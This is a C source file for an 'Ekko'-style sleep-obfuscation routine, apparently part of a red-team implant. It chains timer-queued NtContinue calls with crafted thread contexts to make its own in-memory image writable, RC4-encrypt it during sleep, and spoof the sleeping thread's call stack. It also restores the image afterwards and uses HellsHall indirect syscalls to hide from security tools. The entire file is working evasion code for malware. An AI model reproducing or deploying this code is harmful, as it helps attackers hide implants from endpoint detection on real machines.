#include <Core.h>
#include <Win32.h>
#include <Structs.h>
#include <HellsHall.h>
#include <Sleep.h>
#include <Utils.h>

SEC( text, C ) VOID Ekko ( DWORD SleepTime)

{
    PINSTANCE Instance = ( ((SIZE_T)Start ) + (int)(PBYTE)(&InstancePlaceholder) );
    Instance->Win32.printf( "[INFO] __builtin_return_address from Ekko is 0x%llx\n", __builtin_return_address(0) );
    CONTEXT CtxThread   = { 0 };
    CONTEXT SpoofContext= { 0 };
    CONTEXT RopStart    = { 0 };
    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopBackup   = { 0 };
    CONTEXT RopWrite    = { 0 };
    CONTEXT RopSpoof    = { 0 };
    CONTEXT RopFix      = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  EventTimer  = { 0 };
    HANDLE  EventStart  = { 0 };
    HANDLE  EventEnd    = { 0 };
    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    DWORD   OldProtect  = 0x6969;

    // Can be randomly generated
    CHAR    KeyBuf[ 16 ]= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    USTRING Key = { 0 };
    USTRING Img  = { 0 };

    PVOID   NtContinue  = NULL;
    PVOID   SysFunc032  = NULL;
     
    // For 4th arg, NotificationEvent = 0
    // PUtting && here somehow made only the first event create
    if ( Instance->Win32.NtCreateEvent( &EventStart, EVENT_ALL_ACCESS, NULL, 0, 0 ) != 0 ||
         Instance->Win32.NtCreateEvent( &EventEnd, EVENT_ALL_ACCESS, NULL, 0, 0 )   != 0 ||
         Instance->Win32.NtCreateEvent( &EventTimer, EVENT_ALL_ACCESS, NULL, 0, 0 ) != 0 )
    {
        Instance->Win32.printf( "[ERROR] Failed to create events" );
        return;
    }
    Instance->Win32.RtlCreateTimerQueue( &hTimerQueue) ; // https://doxygen.reactos.org/d8/dd5/ndk_2rtlfuncs_8h.html#a3c33cfe4a773cc54ead6d284427bc12c

    ImageBase   = (PBYTE)((SIZE_T)Start + 0x1 ); // For some fucking reason if i just do start, it resolves to 0. but +0x1 and then -0x1 works???
    ImageBase   -= 0x1;
    ImageSize   =  (PVOID)( (SIZE_T)GetRIPEnd) - ImageBase; //Theres a few bytes at the end that this misses but thats fiiiiiine right?

    Instance->Win32.printf( "[INFO] ImageBase is 0x%llx\n", ImageBase );
    Instance->Win32.printf( "[INFO] ImageSize is 0x%llx\n", ImageSize );

    Key.Buffer  = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    Img.Buffer  = ImageBase;
    Img.Length  = Img.MaximumLength = ImageSize;
    
    // https://doxygen.reactos.org/df/d53/dll_2win32_2kernel32_2client_2timerqueue_8c.html#a1a76d5f2b6b93fd0dbfe0571cd03effd
    if ( Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.RtlCaptureContext, &CtxThread, 100, 0, WT_EXECUTEINTIMERTHREAD ) == 0  &&
         Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtSetEvent, EventTimer, 200, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
    { 

        Instance->Win32.printf( "[INFO] Ekko is at 0x%llx\n", Ekko );
        LARGE_INTEGER li = { 0 };
        li.QuadPart    = (long)-1000000L * ( (long)2 ); //-10000000L = 1 second
        //Instance->Win32.printf("[Info] Waiting up to .2 second for timer to trigger\n");
        Instance->Win32.NtWaitForSingleObject( EventTimer, 0, &li );
        // VX-API OP
        CopyMemoryEx( &SpoofContext, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopStart,  &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopBackup, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopWrite,  &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopSpoof,  &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopFix,    &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );

        /* Using HellsHall to allocate memory for the stub to be copied*/
        MyStruct    S           = { 0 };
        NTDLL       NtdllSt     = { 0 };
        SysFunc     sF          = { 0 };
        InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b, &NtdllSt, &sF);
        getSysFuncStruct(&S.NtAllocateVirtualMemory, &sF);
        InitilizeSysFunc(NtFreeVirtualMemory_CRC32b, &NtdllSt, &sF);
        getSysFuncStruct(&S.NtFreeVirtualMemory, &sF);
        InitilizeSysFunc(NtProtectVirtualMemory_CRC32b, &NtdllSt, &sF); // I wanted to put this above BUT FUCKING OPTIMIZATION KILLED MY SHIT
        getSysFuncStruct(&S.NtProtectVirtualMemory, &sF);
        
        PVOID CopiedProtStub = NULL;
        SIZE_T StubSize = (SIZE_T)GetRIPE - (SIZE_T)ProtStub;

        SetConfig(S.NtAllocateVirtualMemory.wSSN, S.NtAllocateVirtualMemory.pInst);
        NTSTATUS status = HellHall(NtCurrentProcess(), &CopiedProtStub, 0, &StubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0)
            Instance->Win32.printf("[Warning] Alloc returned 0x%llx\n", status);

    
        StubSize = (SIZE_T)GetRIPE - (SIZE_T)ProtStub;                       // Alloc likes to fuck with this so let's set it back to its true value
        // PVOID ProtStubActualAddress =  (SIZE_T)ProtStub; I have 0 clue why this wouldn't work here.
        PVOID ProtStubActualAddress =  (SIZE_T)1 + (SIZE_T)ProtStub;
        ProtStubActualAddress = (PBYTE)(ProtStubActualAddress) - 1;
        CopyMemoryEx( CopiedProtStub, ProtStubActualAddress, StubSize);
        
        PVOID temp = NULL;
        SetConfig(S.NtProtectVirtualMemory.wSSN, S.NtProtectVirtualMemory.pInst);
        status = HellHall(NtCurrentProcess(), &CopiedProtStub, &StubSize, PAGE_EXECUTE_READ, &temp);
        if (status != 0)
            Instance->Win32.printf("[Warning] Protect returned 0x%llx\n", status);

        Instance->Win32.printf( "[Info] Stub is mapped at 0x%llx\n", CopiedProtStub);


        /* Now we set up the contexts that will be fed to the timers */

        // NtWaitForSingleObject( EventTimer, 0, NULL )
        RopStart.Rsp   -= 8;
        RopStart.Rip   = Instance->Win32.NtWaitForSingleObject;
        RopStart.Rcx   = EventStart;
        RopStart.Rdx   = 0;
        RopStart.R8    = NULL;

        /* Changing to RW */
        SIZE_T ProtectionRange = (SIZE_T)ImageSize; // Gotta love how size matters :(. 8 byte ptr to int != 8 byte ptr to 8 byte num
        SIZE_T ProtectionRange2 = (SIZE_T)ImageSize; // Declare 2 of these, one for each Instance-> Since ntprotect will change them up during rop
        ProtStubArgs ProtArgs = { 0 };
        ProtArgs.StackArgs = 1;
        ProtArgs.Args[0] = NtCurrentProcess();
        ProtArgs.Args[1] = &ImageBase;
        ProtArgs.Args[2] = &ProtectionRange;
        ProtArgs.Args[3] = PAGE_READWRITE;
        ProtArgs.Args[4] = &OldProtect;
        RopProtRW.Rsp  -= 8;
        RopProtRW.Rcx   = &ProtArgs;
        RopProtRW.Rip   = CopiedProtStub;
        RopProtRW.R10   = S.NtProtectVirtualMemory.wSSN;
        RopProtRW.R11   = S.NtProtectVirtualMemory.pInst;
        
        // SystemFunction032( &Key, &Img );
        RopMemEnc.Rsp  -= 8;
        RopMemEnc.Rip   = Instance->Win32.SystemFunction032;
        RopMemEnc.Rcx   = &Img;
        RopMemEnc.Rdx   = &Key;

        // "Spoof" the call stack while sleeping by capturing context and making the sleeping thread look like its not sleeping?
        // Our spoofed stack will be pointed to NtTib StackBase and the RIP will be the one from the context backed up during ROP
        HANDLE hDupThandle;
        status = Instance->Win32.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupThandle, THREAD_ALL_ACCESS, 0, 0 );
        CopyMemoryEx( &SpoofContext, &CtxThread, sizeof( CONTEXT ) );

        // Back up the current context (mid sleep)
        // NtGetContextThread( ThreadHandle, &Context );
        CONTEXT BackupContext = { 0 };
        BackupContext.ContextFlags = CONTEXT_FULL;
        RopBackup.Rsp  -= 8;
        RopBackup.Rip   = Instance->Win32.NtGetContextThread;
        RopBackup.Rcx   = hDupThandle;
        RopBackup.Rdx   = &BackupContext;

        // Capturing current context (mid timer setup) and using it to mask the sleep status.
        // NtSetContextThread( ThreadHandle, &Context );
        RopSpoof.Rsp  -= 8;
        RopSpoof.Rip   = Instance->Win32.NtSetContextThread;
        RopSpoof.Rcx   = hDupThandle;
        RopSpoof.Rdx   = &SpoofContext; 

        // * sleepy sounds *
        // NtWaitForSingleObject( hTargetHdl, BOOL alertable, PLARGE_INTEGER SleepTime );
        li.QuadPart    = (long)-10000000L * ((long)SleepTime / 1000 ); // -10000000L = 1 second, and our sleeptime is in milliseconds
        RopDelay.Rsp   -= 8;
        RopDelay.Rip    = Instance->Win32.NtWaitForSingleObject;
        RopDelay.Rcx    = NtCurrentProcess();
        RopDelay.Rdx    = 0;
        RopDelay.R8     = &li;

        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp  -= 8;
        RopMemDec.Rip   = Instance->Win32.SystemFunction032;
        RopMemDec.Rcx   = &Img;
        RopMemDec.Rdx   = &Key;
        
        // Fix it so we don't explode
        // NtSetContextThread( ThreadHandle, &Context );
        RopFix.Rsp  -= 8;
        RopFix.Rip   = Instance->Win32.NtSetContextThread;
        RopFix.Rcx   = hDupThandle;
        RopFix.Rdx   = &BackupContext;

        /* Changing to RX */
        ProtStubArgs ProtArgs2 = ProtArgs;
        ProtArgs2.Args[2] = &ProtectionRange2;
        ProtArgs2.Args[3] = PAGE_EXECUTE_READ;
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rcx   = &ProtArgs2;
        RopProtRX.Rip   = CopiedProtStub;
        RopProtRX.R10   = S.NtProtectVirtualMemory.wSSN;
        RopProtRX.R11   = S.NtProtectVirtualMemory.pInst;

        // SetEvent( hEvent );
        RopSetEvt.Rsp  -= 8;
        RopSetEvt.Rip   = Instance->Win32.NtSetEvent;
        RopSetEvt.Rcx   = EventEnd;
        RopSetEvt.Rdx   = NULL;
        
        Instance->Win32.printf( "[INFO] Queue timers\n" );
        
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopStart, 300, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopProtRW, 400, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopMemEnc, 500, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopBackup,  600, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopSpoof,  700, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopDelay,  800, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopFix,  900, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopMemDec, 1000, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopProtRX, 1100, 0, WT_EXECUTEINTIMERTHREAD );
        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopSetEvt, 1200, 0, WT_EXECUTEINTIMERTHREAD );

        Instance->Win32.printf( "[INFO] Context structs are %d bytes long\n", sizeof(CONTEXT) );
        Instance->Win32.printf( "[INFO] BackupContext is at 0x%llx\n", &BackupContext );
        Instance->Win32.printf( "[INFO] SpoofContext is at 0x%llx\n", &SpoofContext );
        Instance->Win32.printf( "[INFO] Wait for EventEnd\n" );
        Instance->Win32.NtSignalAndWaitForSingleObject( EventStart, EventEnd, 0, NULL );

        Instance->Win32.printf( "[INFO] Finished waiting for event\n" );

        temp = NULL;
        SetConfig(S.NtFreeVirtualMemory.wSSN, S.NtFreeVirtualMemory.pInst);
        status = HellHall((HANDLE)-1, &CopiedProtStub, &temp, MEM_RELEASE); // free the stub completely
        if (status != 0)
            Instance->Win32.printf("[Warning] Free returned 0x%llx\n", status);
    }

    Instance->Win32.RtlDeleteTimerQueueEx( hTimerQueue, 0 );

}